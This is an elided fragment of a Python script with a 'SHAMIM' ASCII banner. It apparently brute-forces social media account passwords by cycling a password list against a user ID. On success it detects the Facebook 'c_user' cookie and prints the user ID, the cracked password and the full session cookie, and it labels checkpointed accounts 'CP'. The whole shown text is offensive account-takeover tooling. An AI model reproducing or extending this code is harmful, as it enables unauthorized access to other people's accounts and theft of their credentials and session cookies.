...
logo = ("""\033[1;37m
      _____ _    _          __  __ _____ __  __            _  ______     __
  / ____| |  | |   /\   |  \/  |_   _|  \/  |          | |/ __ \ \   / /
 | (___ | |__| |  /  \  | \  / | | | | \  / |______    | | |  | \ \_/ / 
  \___ \|  __  | / /\ \ | |\/| | | | | |\/| |______|   | | |  | |\   /  
  ____) | |  | |/ ____ \| |  | |_| |_| |  | |     | |__| | |__| | | |   
 |_____/|_|  |_/_/    \_\_|  |_|_____|_|  |_|      \____/ \____/  |_|   
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[SHAMIM]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[SHAMIM😈-OK] {uid}|{ps} \nCookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[SHAMIM😈-CP] {cid}|{ps}")
